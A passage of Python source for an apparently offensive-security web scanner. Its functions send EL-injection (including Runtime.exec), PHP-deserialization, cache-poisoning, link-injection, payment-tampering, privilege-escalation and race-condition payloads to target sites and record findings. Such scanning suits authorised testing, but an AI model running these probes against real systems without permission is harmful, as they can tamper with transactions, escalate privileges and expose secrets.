                    # Parse basic YAML manually for common patterns
                    continue
            else:
                try:
                    import json as _j
                    spec = _j.loads(r.text)
                except Exception:
                    continue
            if isinstance(spec, dict) and ("paths" in spec or "swagger" in spec or "openapi" in spec):
                spec_url = f"{base_url}{path}"
                break
        except Exception:
            continue

    if not spec:
        return None

    # Extract server base URL from spec
    servers = spec.get("servers", [])
    api_base = base_url
    if servers and isinstance(servers, list):
        srv = servers[0].get("url", "")
        if srv.startswith("http"):
            api_base = srv.rstrip("/")
        elif srv.startswith("/"):
            api_base = base_url + srv.rstrip("/")

    # Parse all paths
    paths = spec.get("paths", {})
    for path, methods in paths.items():
        if not isinstance(methods, dict):
            continue
        full_url = f"{api_base}{path}"

        for method, operation in methods.items():
            if method.lower() not in ("get", "post", "put", "patch", "delete", "options"):
                continue
            if not isinstance(operation, dict):
                continue

            # Extract parameters
            op_params = operation.get("parameters", []) + methods.get("parameters", [])
            path_params = set()
            query_params = set()
            body_params = set()

            for p in op_params:
                if not isinstance(p, dict):
                    continue
                name = p.get("name", "")
                location = p.get("in", "")
                if location == "query":
                    query_params.add(name)
                elif location == "path":
                    path_params.add(name)

            # Extract request body schema params
            req_body = operation.get("requestBody", {})
            if req_body:
                content = req_body.get("content", {})
                for ct, ct_data in content.items():
                    schema = ct_data.get("schema", {})
                    props = schema.get("properties", {})
                    body_params.update(props.keys())
                    # Handle $ref
                    ref = schema.get("$ref", "")
                    if ref:
                        ref_name = ref.split("/")[-1]
                        defs = spec.get("components", {}).get("schemas", spec.get("definitions", {}))
                        ref_schema = defs.get(ref_name, {})
                        body_params.update(ref_schema.get("properties", {}).keys())

            # Add to crawl data
            # Replace path params with test values
            test_url = full_url
            for pp in path_params:
                test_url = test_url.replace(f"{{{pp}}}", "1")

            if query_params:
                for qp in query_params:
                    params[test_url].add(qp)

            pages.append({"url": test_url, "status": 200, "length": 0,
                          "method": method.upper(), "from_spec": True})

            if method.lower() in ("post", "put", "patch") and body_params:
                forms.append({
                    "url": test_url,
                    "action": test_url,
                    "method": method.upper(),
                    "inputs": [{"name": p, "type": "text", "value": "test"} for p in body_params],
                    "from_spec": True,
                })

    total = len(pages)
    return {
        "pages": pages,
        "forms": forms,
        "params": {u: list(p) for u, p in params.items()},
        "links": [p["url"] for p in pages],
        "spec_url": spec_url,
        "total_endpoints": total,
    }


# ---------------------------------------------------------------------------
# Authenticated crawl — logs in first, then crawls with session cookies
# ---------------------------------------------------------------------------

def authenticated_crawl(base_url, username, password, max_pages=50):
    """Log in and crawl authenticated pages — finds bugs behind login."""
    import json as _j

    session = requests.Session()
    session.verify = False
    session.headers.update({"User-Agent": _USER_AGENTS[0]})

    logged_in = False
    login_paths = ["/login", "/signin", "/auth/login", "/api/login",
                   "/api/auth", "/api/v1/login", "/api/v1/auth",
                   "/user/login", "/account/login", "/auth/signin"]

    for path in login_paths:
        url = f"{base_url}{path}"
        try:
            r = session.get(url, timeout=5)
            if r.status_code not in (200, 405):
                continue
            # Try JSON login
            for payload in [
                {"username": username, "password": password},
                {"email": username, "password": password},
                {"user": username, "pass": password},
                {"login": username, "password": password},
                {"identifier": username, "password": password},
            ]:
                r2 = session.post(url, json=payload, timeout=5)
                body = r2.text.lower()
                if (r2.status_code in (200, 201) and
                        any(x in body for x in ["token","dashboard","welcome","logout","profile","success"]) and
                        not any(x in body for x in ["invalid","incorrect","failed","wrong","error"])):
                    # Extract JWT if present
                    import re as _re
                    jwt_match = _re.search(r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+', r2.text)
                    if jwt_match:
                        session.headers["Authorization"] = f"Bearer {jwt_match.group()}"
                    logged_in = True
                    break
                # Try form-based login
                from bs4 import BeautifulSoup as _BS
                soup = _BS(r.text, "lxml")
                form = soup.find("form")
                if form and not logged_in:
                    data = {}
                    for inp in form.find_all("input"):
                        name = inp.get("name", "")
                        if not name: continue
                        if any(x in name.lower() for x in ["user","email","login","identifier"]):
                            data[name] = username
                        elif any(x in name.lower() for x in ["pass","pwd","secret"]):
                            data[name] = password
                        else:
                            data[name] = inp.get("value", "")
                    action = form.get("action", url)
                    if not action.startswith("http"):
                        action = base_url + action
                    r3 = session.post(action, data=data, timeout=5, allow_redirects=True)
                    if r3.status_code in (200, 302) and "logout" in r3.text.lower():
                        logged_in = True
            if logged_in:
                break
        except Exception:
            continue

    if not logged_in:
        return None

    # Now crawl with authenticated session
    visited = set()
    to_visit = [base_url]
    pages, forms, params_found, links = [], [], defaultdict(set), set()

    while to_visit and len(visited) < max_pages:
        url = to_visit.pop(0)
        norm = url.split("?")[0].split("#")[0]
        if norm in visited:
            continue
        visited.add(norm)
        try:
            r = session.get(url, timeout=10, allow_redirects=True)
        except Exception:
            continue

        pages.append({"url": url, "status": r.status_code, "length": len(r.content),
                      "authenticated": True})

        ctype = r.headers.get("content-type", "").lower()
        if "application/json" in ctype:
            try:
                data = _j.loads(r.text)
                if isinstance(data, dict):
                    for k in data.keys():
                        params_found[norm].add(k)
            except Exception:
                pass
            continue

        from bs4 import BeautifulSoup as _BS2
        soup = _BS2(r.text, "lxml")
        for tag in soup.find_all("a", href=True):
            full = urllib.parse.urljoin(url, tag["href"])
            parsed = urllib.parse.urlparse(full)
            base_parsed = urllib.parse.urlparse(base_url)
            if parsed.netloc == base_parsed.netloc:
                clean = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
                if parsed.query:
                    for k in urllib.parse.parse_qs(parsed.query):
                        params_found[clean].add(k)
                links.add(full)
                if clean not in visited:
                    to_visit.append(full)
        for form in soup.find_all("form"):
            action = urllib.parse.urljoin(url, form.get("action", ""))
            method = form.get("method", "get").upper()
            inputs = [{"name": i.get("name",""), "type": i.get("type","text"),
                       "value": i.get("value","")}
                      for i in form.find_all(["input","textarea","select"]) if i.get("name")]
            forms.append({"url": url, "action": action, "method": method,
                          "inputs": inputs, "authenticated": True})

    return {
        "pages": pages, "forms": forms,
        "params": {u: list(p) for u, p in params_found.items()},
        "links": list(links),
        "session": session,
    }


# ---------------------------------------------------------------------------
# ELITE BATCH 7: vhost fuzzing, subdomain permutation, H2C smuggling,
#                EL injection, PHP object injection, cache key injection,
#                link injection, iframe injection
# ---------------------------------------------------------------------------

_VHOST_WORDLIST = [
    "api","app","admin","dev","staging","test","beta","internal","corp","vpn",
    "mail","git","gitlab","jenkins","jira","confluence","portal","dashboard",
    "login","auth","sso","cdn","static","assets","media","upload","backup",
    "db","redis","elastic","kibana","grafana","metrics","logs","monitor",
    "shop","blog","docs","help","support","wiki","forum","sandbox","qa","uat",
    "preprod","prod","mobile","ws","socket","push","webhook","graphql","rest",
    "microservice","gateway","proxy","old","legacy","new","next","v1","v2",
    "secure","ssl","intranet","extranet","remote","office","employee","staff",
]

def scan_vhost_fuzzing(web_targets):
    """Virtual host fuzzing — find hidden apps on the same IP."""
    findings = []
    for target in web_targets[:3]:
        parsed = urllib.parse.urlparse(target)
        host = parsed.netloc.split(":")[0]
        domain_parts = host.split(".")
        if len(domain_parts) < 2:
            continue
        tld = ".".join(domain_parts[-2:])
        try:
            baseline = _S.get(target, timeout=5)
            baseline_len = len(baseline.content)
            baseline_title = re.search(r"<title>([^<]+)</title>", baseline.text, re.I)
            baseline_title = baseline_title.group(1) if baseline_title else ""
        except Exception:
            continue
        for word in _VHOST_WORDLIST:
            vhost = f"{word}.{tld}"
            try:
                r = _S.get(target, timeout=5, headers={"Host": vhost})
                if r.status_code in (200, 301, 302, 403):
                    # Different content = different app
                    if abs(len(r.content) - baseline_len) > 200:
                        title = re.search(r"<title>([^<]+)</title>", r.text, re.I)
                        title = title.group(1) if title else ""
                        if title != baseline_title:
                            findings.append({
                                "type": f"Virtual Host Found: {vhost}",
                                "severity": "medium",
                                "url": target,
                                "detail": f"Host: {vhost} returns different app (title: {title[:50]})",
                                "template": "apex-vhost",
                            })
            except Exception:
                continue
    return findings


def scan_subdomain_permutation(target, subdomains):
    """Generate and resolve subdomain permutations — finds dev-api, api2, api-v2, etc."""
    import socket
    found = []
    domain_parts = target.split(".")
    base = ".".join(domain_parts[-2:])
    existing_prefixes = set()
    for sub in subdomains:
        prefix = sub.replace(f".{base}", "").replace(base, "")
        if prefix:
            existing_prefixes.add(prefix)

    permutations = set()
    prefixes = list(existing_prefixes)[:20] + ["api", "app", "admin", "dev", "staging"]
    modifiers = ["2", "-v2", "-new", "-old", "-dev", "-staging", "-test",
                 "-beta", "-internal", "-prod", "-backup", "2", "3"]
    for p in prefixes:
        for m in modifiers:
            permutations.add(f"{p}{m}.{base}")
            permutations.add(f"{m.strip('-')}-{p}.{base}")

    def resolve(fqdn):
        try:
            socket.getaddrinfo(fqdn, None, socket.AF_INET)
            return fqdn
        except Exception:
            return None

    from concurrent.futures import ThreadPoolExecutor, as_completed
    findings = []
    with ThreadPoolExecutor(max_workers=50) as pool:
        futures = {pool.submit(resolve, p): p for p in permutations
                   if p not in subdomains}
        for future in as_completed(futures):
            result = future.result()
            if result:
                found.append(result)
                findings.append({
                    "type": "Subdomain Permutation Found",
                    "severity": "info",
                    "url": f"https://{result}",
                    "detail": f"Permutation of existing subdomains: {result}",
                    "template": "apex-subdomain-perm",
                })
    return findings, found


def scan_h2c_smuggling(web_targets):
    """H2C (HTTP/2 cleartext) upgrade smuggling — bypass reverse proxies."""
    findings = []
    for target in web_targets[:5]:
        try:
            # Send HTTP/1.1 Upgrade: h2c request
            r = _S.get(target, timeout=5, headers={
                "Upgrade": "h2c",
                "HTTP2-Settings": "AAMAAABkAAQAAP__",
                "Connection": "Upgrade, HTTP2-Settings",
            })
            # If server responds with 101 Switching Protocols, it's vulnerable
            if r.status_code == 101:
                findings.append({
                    "type": "H2C Smuggling (HTTP/2 Cleartext Upgrade)",
                    "severity": "high",
                    "url": target,
                    "detail": "Server accepts h2c upgrade — reverse proxy bypass possible",
                    "template": "apex-h2c",
                })
            # Even 200 with Upgrade header echoed can indicate misconfiguration
            elif "upgrade" in r.headers.get("Connection", "").lower():
                findings.append({
                    "type": "H2C Upgrade Header Reflected",
                    "severity": "medium",
                    "url": target,
                    "detail": "Server reflects Upgrade header — potential h2c smuggling",
                    "template": "apex-h2c",
                })
        except Exception:
            continue
    return findings


def scan_expression_language_injection(crawl_data):
    """Expression Language injection — Spring EL, Thymeleaf, JSP EL → RCE."""
    findings = []
    # EL payloads that evaluate to a known value
    payloads = [
        ("${7*7}", "49"),
        ("#{7*7}", "49"),
        ("*{7*7}", "49"),
        ("${T(java.lang.Runtime).getRuntime().exec('id')}", "java"),
        ("${applicationScope}", "org.springframework"),
        ("[[${7*7}]]", "49"),          # Thymeleaf inline
        ("[(${7*7})]", "49"),          # Thymeleaf unescaped
        ("%24%7B7*7%7D", "49"),        # URL-encoded
    ]
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            for payload, marker in payloads:
                try:
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [payload]
                    test_url = parsed._replace(
                        query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    if marker in r.text and payload not in r.text:
                        findings.append({
                            "type": "Expression Language Injection",
                            "severity": "critical",
                            "url": test_url,
                            "detail": f"EL executed via param '{p}': {payload} → {marker}",
                            "template": "apex-el-injection",
                        })
                        break
                except Exception:
                    continue
    # Also test form inputs
    for form in crawl_data.get("forms", []):
        action = form.get("action", "")
        if not action:
            continue
        for inp in form.get("inputs", []):
            if inp.get("type") in ("submit", "hidden", "button"):
                continue
            for payload, marker in payloads[:3]:
                try:
                    data = {i.get("name", "f"): i.get("value", "test")
                            for i in form.get("inputs", [])}
                    data[inp.get("name", "x")] = payload
                    r = _S.post(action, data=data, timeout=_TIMEOUT)
                    if marker in r.text and payload not in r.text:
                        findings.append({
                            "type": "Expression Language Injection (Form)",
                            "severity": "critical",
                            "url": action,
                            "detail": f"EL executed in field '{inp.get('name')}': {payload}",
                            "template": "apex-el-injection",
                        })
                        break
                except Exception:
                    continue
    return findings


def scan_php_object_injection(crawl_data):
    """PHP object injection via serialized cookie/param values."""
    import base64 as _b64
    findings = []
    # PHP serialized object markers
    php_serial_re = re.compile(r'[OoAasSiIdDbBrR]:\d+:')
    # Payloads that trigger errors if deserialized
    payloads = [
        'O:8:"stdClass":0:{}',
        'a:1:{i:0;O:8:"stdClass":0:{}}',
        'O:29:"Illuminate\\Support\\MessageBag":0:{}',  # Laravel gadget
    ]
    for page in crawl_data.get("pages", [])[:10]:
        try:
            r = _S.get(page["url"], timeout=5)
            # Check cookies for serialized PHP objects
            for name, val in r.cookies.items():
                try:
                    decoded = _b64.b64decode(val + "==").decode("utf-8", errors="ignore")
                    if php_serial_re.search(decoded):
                        findings.append({
                            "type": "PHP Object Injection (Serialized Cookie)",
                            "severity": "critical",
                            "url": page["url"],
                            "detail": f"Cookie '{name}' contains PHP serialized object",
                            "template": "apex-php-obj",
                        })
                except Exception:
                    pass
                if php_serial_re.search(val):
                    findings.append({
                        "type": "PHP Object Injection (Raw Cookie)",
                        "severity": "critical",
                        "url": page["url"],
                        "detail": f"Cookie '{name}' is raw PHP serialized",
                        "template": "apex-php-obj",
                    })
        except Exception:
            pass
    # Test params with serialized payloads
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            for payload in payloads[:1]:
                try:
                    import base64 as _b64
                    encoded = _b64.b64encode(payload.encode()).decode()
                    parsed = urllib.parse.urlparse(url)
                    qs = urllib.parse.parse_qs(parsed.query)
                    qs[p] = [encoded]
                    test_url = parsed._replace(
                        query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    if any(x in r.text.lower() for x in
                           ["unserialize", "__wakeup", "__destruct",
                            "fatal error", "exception", "stdclass"]):
                        findings.append({
                            "type": "PHP Object Injection (Param)",
                            "severity": "critical",
                            "url": test_url,
                            "detail": f"PHP deserialization triggered via param '{p}'",
                            "template": "apex-php-obj",
                        })
                        break
                except Exception:
                    continue
    return findings


def scan_cache_key_injection(crawl_data):
    """Cache key injection — inject into cache key to poison cache for other users."""
    findings = []
    tested = set()
    for page in crawl_data.get("pages", [])[:5]:
        base = "/".join(page["url"].split("/", 3)[:3])
        if base in tested:
            continue
        tested.add(base)
        try:
            baseline = _S.get(page["url"], timeout=5)
        except Exception:
            continue
        # Headers that may be part of cache key
        inject_headers = {
            "X-Forwarded-Host": f"apex-cache-test.evil.com",
            "X-Original-URL": "/apex-cache-inject",
            "X-Rewrite-URL": "/apex-cache-inject",
            "X-Forwarded-Prefix": "/apex-cache-inject",
        }
        for header, value in inject_headers.items():
            try:
                r = _S.get(page["url"], timeout=5, headers={header: value})
                # If injected value appears in response, it's in the cache key
                if value.split(".")[-2] in r.text or "apex-cache" in r.text:
                    findings.append({
                        "type": f"Cache Key Injection via {header}",
                        "severity": "high",
                        "url": page["url"],
                        "detail": f"{header}: {value} reflected — cache poisoning possible",
                        "template": "apex-cache-key",
                    })
            except Exception:
                continue
    return findings


def scan_link_injection(crawl_data):
    """Link injection — inject links into pages to hijack navigation."""
    findings = []
    payload = "https://evil.com"
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            if not any(x in p.lower() for x in
                       ["url", "link", "href", "src", "action", "next",
                        "redirect", "return", "goto", "target", "ref"]):
                continue
            try:
                parsed = urllib.parse.urlparse(url)
                qs = urllib.parse.parse_qs(parsed.query)
                qs[p] = [payload]
                test_url = parsed._replace(
                    query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                r = _S.get(test_url, timeout=_TIMEOUT)
                # Check if evil.com appears as an href/src in the response
                if re.search(r'(?:href|src|action)=["\']https://evil\.com', r.text):
                    findings.append({
                        "type": "Link Injection",
                        "severity": "medium",
                        "url": test_url,
                        "detail": f"Param '{p}' injects link into page HTML",
                        "template": "apex-link-inject",
                    })
                    break
            except Exception:
                continue
    return findings


# ---------------------------------------------------------------------------
# ELITE BATCH 8: Automatable logic bugs — the ones scanners miss
# Multi-step races, price manipulation, payment bypass, account state,
# mass user enumeration, forced browsing, parameter tampering
# ---------------------------------------------------------------------------

def scan_price_manipulation(crawl_data):
    """Test price/quantity/discount manipulation — negative values, zero, overflow."""
    findings = []
    price_params = ("price","amount","qty","quantity","total","cost","discount",
                    "coupon","credit","points","balance","fee","tax","subtotal")
    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            if p.lower() not in price_params:
                continue
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query)
            orig = qs.get(p, ["1"])[0]
            for test_val, label in [
                ("-1", "negative"),
                ("0", "zero"),
                ("0.001", "fractional"),
                ("99999999", "overflow"),
                ("-0.01", "negative fractional"),
            ]:
                try:
                    qs[p] = [test_val]
                    test_url = parsed._replace(
                        query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=_TIMEOUT)
                    if r.status_code == 200 and not any(
                            x in r.text.lower() for x in
                            ["invalid","error","must be","greater","positive","minimum"]):
                        findings.append({
                            "type": f"Price Manipulation: {p}={test_val} ({label})",
                            "severity": "high", "url": test_url,
                            "detail": f"Param '{p}' accepts {label} value without error",
                            "template": "apex-price",
                        })
                        break
                except Exception:
                    continue
    # Also test POST forms with price fields
    for form in crawl_data.get("forms", []):
        if form.get("method", "").upper() != "POST":
            continue
        for inp in form.get("inputs", []):
            if inp.get("name", "").lower() not in price_params:
                continue
            for test_val in ["-1", "0", "-0.01"]:
                try:
                    data = {i.get("name","f"): i.get("value","1")
                            for i in form.get("inputs", [])}
                    data[inp["name"]] = test_val
                    r = _S.post(form["action"], data=data, timeout=_TIMEOUT)
                    if r.status_code in (200, 201) and not any(
                            x in r.text.lower() for x in ["invalid","error","positive"]):
                        findings.append({
                            "type": f"Price Manipulation via Form: {inp['name']}={test_val}",
                            "severity": "high", "url": form["action"],
                            "detail": f"Form accepts {test_val} for price field '{inp['name']}'",
                            "template": "apex-price",
                        })
                        break
                except Exception:
                    continue
    return findings


def scan_payment_flow_bypass(crawl_data):
    """Test payment/checkout flow bypass — skip to confirmation without paying."""
    findings = []
    # Look for multi-step flow indicators
    step_urls = []
    confirm_urls = []
    for page in crawl_data.get("pages", []):
        url = page["url"].lower()
        if any(x in url for x in ["checkout","cart","order","payment","pay","billing"]):
            step_urls.append(page["url"])
        if any(x in url for x in ["confirm","success","complete","done","thank","receipt"]):
            confirm_urls.append(page["url"])

    # Try accessing confirmation pages directly without going through payment
    for confirm_url in confirm_urls[:5]:
        try:
            r = _S.get(confirm_url, timeout=5)
            if r.status_code == 200:
                body = r.text.lower()
                # Check if it shows real order data (not just a template)
                if any(x in body for x in
                       ["order","confirmation","receipt","thank you","payment","purchase"]):
                    findings.append({
                        "type": "Payment Flow Bypass (Direct Access)",
                        "severity": "high", "url": confirm_url,
                        "detail": "Confirmation page accessible without completing payment flow",
                        "template": "apex-payment-bypass",
                    })
        except Exception:
            continue

    # Test parameter tampering on payment forms
    for form in crawl_data.get("forms", []):
        action = form.get("action", "").lower()
        if not any(x in action for x in ["pay","checkout","order","purchase","billing"]):
            continue
        inputs = form.get("inputs", [])
        # Look for hidden fields that control payment status
        hidden = [i for i in inputs if i.get("type") == "hidden"]
        for h in hidden:
            name = h.get("name", "").lower()
            val = h.get("value", "").lower()
            if any(x in name for x in ["status","paid","payment","amount","total","price"]):
                try:
                    data = {i.get("name","f"): i.get("value","") for i in inputs}
                    # Tamper: set status to paid/success, amount to 0
                    if "status" in name:
                        data[h["name"]] = "paid"
                    elif "amount" in name or "total" in name or "price" in name:
                        data[h["name"]] = "0"
                    r = _S.post(form["action"], data=data, timeout=5)
                    if r.status_code in (200, 302):
                        findings.append({
                            "type": f"Payment Parameter Tampering: {h['name']}",
                            "severity": "critical", "url": form["action"],
                            "detail": f"Hidden field '{h['name']}' controls payment — tampered to '{data[h['name']]}'",
                            "template": "apex-payment-bypass",
                        })
                except Exception:
                    continue
    return findings


def scan_account_state_manipulation(crawl_data):
    """Test account state manipulation — activate unverified accounts, bypass email verification."""
    findings = []
    for page in crawl_data.get("pages", []):
        url = page["url"]
        url_lower = url.lower()
        # Look for verification/activation endpoints
        if not any(x in url_lower for x in
                   ["verify","activate","confirm","token","email","account"]):
            continue
        base = "/".join(url.split("/", 3)[:3])

        # Test common verification bypass patterns
        bypass_tests = [
            # Empty token
            (url + "?token=", "empty token"),
            (url + "?token=null", "null token"),
            (url + "?token=undefined", "undefined token"),
            (url + "?token=0", "zero token"),
            # Already-used token patterns
            (url + "?token=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "predictable token"),
        ]
        for test_url, label in bypass_tests:
            try:
                r = _S.get(test_url, timeout=5)
                if r.status_code in (200, 302):
                    body = r.text.lower()
                    if any(x in body for x in
                           ["verified","activated","confirmed","success","welcome"]):
                        findings.append({
                            "type": f"Account Verification Bypass ({label})",
                            "severity": "critical", "url": test_url,
                            "detail": f"Account verified with {label}",
                            "template": "apex-account-state",
                        })
                        break
            except Exception:
                continue

        # Test if verification endpoint leaks valid tokens via timing
        try:
            import time as _t
            times = []
            for token in ["a"*40, "b"*40, "c"*40]:
                start = _t.time()
                _S.get(f"{base}/verify?token={token}", timeout=5)
                times.append(_t.time() - start)
            if max(times) - min(times) > 0.5:
                findings.append({
                    "type": "Verification Token Timing Oracle",
                    "severity": "medium", "url": f"{base}/verify",
                    "detail": f"Token validation timing varies by {(max(times)-min(times))*1000:.0f}ms — oracle possible",
                    "template": "apex-account-state",
                })
        except Exception:
            pass
    return findings


def scan_forced_browsing(crawl_data, web_targets):
    """Forced browsing — access resources that should require auth or specific state."""
    findings = []
    # Common paths that should be protected but often aren't
    sensitive_paths = [
        "/admin", "/admin/users", "/admin/config", "/admin/logs",
        "/api/admin", "/api/users", "/api/config", "/api/keys",
        "/api/v1/admin", "/api/v1/users", "/api/v1/export",
        "/export", "/export/users", "/export/data", "/export/csv",
        "/backup", "/backup/db", "/dump", "/data/export",
        "/internal", "/internal/api", "/internal/admin",
        "/debug", "/debug/vars", "/debug/pprof", "/debug/info",
        "/metrics", "/health/details", "/status/details",
        "/swagger", "/swagger-ui", "/api-docs", "/openapi",
        "/graphql", "/graphiql", "/playground",
        "/jenkins", "/jenkins/script", "/jenkins/console",
        "/phpmyadmin", "/adminer", "/dbadmin",
        "/wp-admin", "/wp-admin/users.php",
        "/actuator/env", "/actuator/heapdump", "/actuator/beans",
        "/.git/config", "/.env", "/config.json", "/secrets.json",
    ]
    for target in web_targets[:3]:
        base = "/".join(target.split("/", 3)[:3])
        try:
            r404 = _S.get(f"{base}/nonexistent_apex_test_xyz_12345", timeout=3)
            size_404 = len(r404.content)
            status_404 = r404.status_code
        except Exception:
            continue
        for path in sensitive_paths:
            try:
                r = _S.get(f"{base}{path}", timeout=5, allow_redirects=False)
                # Must be 200 and different from 404
                if (r.status_code == 200 and
                        abs(len(r.content) - size_404) > 100):
                    body = r.text[:500].lower()
                    # Must have real content, not a generic page
                    if any(x in body for x in
                           ["admin","user","config","key","secret","token","password",
                            "email","database","export","backup","debug","metric",
                            "swagger","graphql","actuator","jenkins","phpmyadmin"]):
                        findings.append({
                            "type": f"Forced Browsing: {path}",
                            "severity": "high",
                            "url": f"{base}{path}",
                            "detail": f"Sensitive path accessible without auth ({len(r.content)}b)",
                            "template": "apex-forced-browse",
                        })
            except Exception:
                continue
    return findings


def scan_parameter_tampering(crawl_data):
    """Parameter tampering — modify role/admin/privilege params to escalate."""
    findings = []
    priv_params = ("role","admin","is_admin","isAdmin","superuser","privilege",
                   "level","group","type","plan","tier","access","permission",
                   "scope","authority","rank","status","verified","active")
    priv_values = ("admin","administrator","superuser","root","1","true","staff",
                   "moderator","owner","manager","super","god","system")

    for url, params in crawl_data.get("params", {}).items():
        for p in params:
            if p.lower() not in priv_params:
                continue
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query)
            orig_val = qs.get(p, ["user"])[0]
            try:
                baseline = _S.get(url, timeout=5)
                baseline_len = len(baseline.content)
            except Exception:
                continue
            for val in priv_values:
                try:
                    qs[p] = [val]
                    test_url = parsed._replace(
                        query=urllib.parse.urlencode(qs, doseq=True)).geturl()
                    r = _S.get(test_url, timeout=5)
                    if (r.status_code == 200 and
                            abs(len(r.content) - baseline_len) > 200):
                        findings.append({
                            "type": f"Parameter Tampering: {p}={val}",
                            "severity": "critical", "url": test_url,
                            "detail": f"Setting '{p}={val}' changes response by {abs(len(r.content)-baseline_len)}b — privilege escalation possible",
                            "template": "apex-param-tamper",
                        })
                        break
                except Exception:
                    continue

    # Also test POST forms
    for form in crawl_data.get("forms", []):
        if form.get("method", "").upper() != "POST":
            continue
        action = form.get("action", "")
        if not action:
            continue
        inputs = form.get("inputs", [])
        try:
            baseline_data = {i.get("name","f"): i.get("value","test") for i in inputs}
            baseline = _S.post(action, data=baseline_data, timeout=5)
        except Exception:
            continue
        for inp in inputs:
            if inp.get("name","").lower() not in priv_params:
                continue
            for val in priv_values[:3]:
                try:
                    data = dict(baseline_data)
                    data[inp["name"]] = val
                    r = _S.post(action, data=data, timeout=5)
                    if (r.status_code == 200 and
                            abs(len(r.content) - len(baseline.content)) > 200):
                        findings.append({
                            "type": f"Parameter Tampering in Form: {inp['name']}={val}",
                            "severity": "critical", "url": action,
                            "detail": f"Form field '{inp['name']}={val}' changes response",
                            "template": "apex-param-tamper",
                        })
                        break
                except Exception:
                    continue
    return findings


def scan_multi_step_race(crawl_data):
    """Multi-step race conditions — coupon reuse, concurrent purchases, double-spend."""
    import concurrent.futures as _cf
    findings = []

    # Find coupon/promo/voucher endpoints
    coupon_paths = []
    for page in crawl_data.get("pages", []):
        url = page["url"].lower()
        if any(x in url for x in ["coupon","promo","voucher","discount","redeem","code","gift"]):
            coupon_paths.append(page["url"])

    for form in crawl_data.get("forms", []):
        action = form.get("action", "").lower()
        if any(x in action for x in ["coupon","promo","voucher","discount","redeem"]):
            coupon_paths.append(form["action"])

    for url in coupon_paths[:3]:
        # Fire 10 simultaneous requests with same coupon code
        def apply_coupon(u):
            try:
                return _S.post(u, data={"code": "TESTCOUPON10", "coupon": "TESTCOUPON10",
                                        "promo": "TESTCOUPON10"}, timeout=5)
            except Exception:
                return None

        with _cf.ThreadPoolExecutor(max_workers=10) as pool:
            results = list(pool.map(apply_coupon, [url]*10))

        success = [r for r in results if r and r.status_code in (200, 201)
                   and not any(x in (r.text or "").lower()
                               for x in ["invalid","expired","used","error"])]
        if len(success) > 1:
            findings.append({
                "type": "Race Condition: Coupon/Promo Reuse",
                "severity": "high", "url": url,
                "detail": f"{len(success)}/10 parallel coupon applications succeeded — double-use possible",
                "template": "apex-race-coupon",
            })

    # Test concurrent balance/credit operations
    for form in crawl_data.get("forms", []):
        action = form.get("action", "").lower()
        if not any(x in action for x in ["transfer","withdraw","redeem","spend","use"]):
            continue
        inputs = form.get("inputs", [])
        data = {i.get("name","f"): i.get("value","1") for i in inputs}

        def do_request(d):
            try:
                return _S.post(form["action"], data=d, timeout=5)
            except Exception:
                return None

        with _cf.ThreadPoolExecutor(max_workers=10) as pool:
            results = list(pool.map(do_request, [data]*10))

        success = [r for r in results if r and r.status_code in (200, 201)
                   and "success" in (r.text or "").lower()]
        if len(success) > 1:
            findings.append({
                "type": "Race Condition: Concurrent Transaction",
                "severity": "critical", "url": form["action"],
                "detail": f"{len(success)}/10 parallel transactions succeeded — double-spend possible",
                "template": "apex-race-coupon",
            })
    return findings


# ---------------------------------------------------------------------------
# ELITE BATCH 9: Multi-step flow testing, two-account IDOR,
#                GraphQL field suggestion enumeration,
#                API version detection, legacy endpoint finder
# ---------------------------------------------------------------------------

def scan_multi_step_auth_flow(crawl_data, web_targets):
    """Test multi-step authentication flows for bypass — skip steps, replay tokens."""
    findings = []
    # Find multi-step indicators in pages
    step_indicators = ["step=", "stage=", "phase=", "wizard", "step-", "/step/",
                       "verify", "confirm", "otp", "2fa", "mfa", "token="]
    flow_pages = [p for p in crawl_data.get("pages", [])
                  if any(x in p["url"].lower() for x in step_indicators)]

    for page in flow_pages[:5]:
        url = page["url"]
        base = "/".join(url.split("/", 3)[:3])
        # Try to skip to later steps directly
        for skip_path in ["/confirm", "/verify", "/complete", "/success",
                          "/step/3", "/step/4", "/final", "/done"]:
            try:
                r = _S.get(f"{base}{skip_path}", timeout=5)
                if r.status_code == 200 and len(r.content) > 200:
                    body = r.text.lower()
                    if not any(x in body for x in ["login", "sign in", "unauthorized", "forbidden"]):
                        findings.append({
                            "type": f"Multi-Step Flow Bypass: {skip_path}",
                            "severity": "high",
                            "url": f"{base}{skip_path}",
                            "detail": f"Step {skip_path} accessible without completing prior steps",
                            "template": "apex-flow-bypass",
                        })
            except: continue

    # Test token reuse — submit same OTP/token twice
    for page in flow_pages[:3]:
        url = page["url"]
        if "token=" in url or "otp=" in url or "code=" in url:
            try:
                # First request
                r1 = _S.get(url, timeout=5)
                # Second request with same token
                r2 = _S.get(url, timeout=5)
                if r1.status_code == 200 and r2.status_code == 200:
                    if "invalid" not in r2.text.lower() and "expired" not in r2.text.lower():
                        findings.append({
                            "type": "Token Reuse (No Single-Use Enforcement)",
                            "severity": "medium",
                            "url": url,
                            "detail": "Token/OTP accepted on second use — not invalidated after first use",
                            "template": "apex-token-reuse",
                        })
            except: pass

    return findings


def scan_graphql_field_enumeration(crawl_data):
    """Enumerate GraphQL schema via field suggestions — works even when introspection is disabled."""
    findings = []
    tested = set()
    # Common field names to probe
    field_guesses = [
        "user", "users", "me", "profile", "account", "admin", "password",
        "email", "token", "secret", "key", "apiKey", "creditCard", "card",
        "payment", "balance", "limit", "creditLimit", "ssn", "phone",
        "address", "dob", "dateOfBirth", "role", "permissions", "isAdmin",
    ]
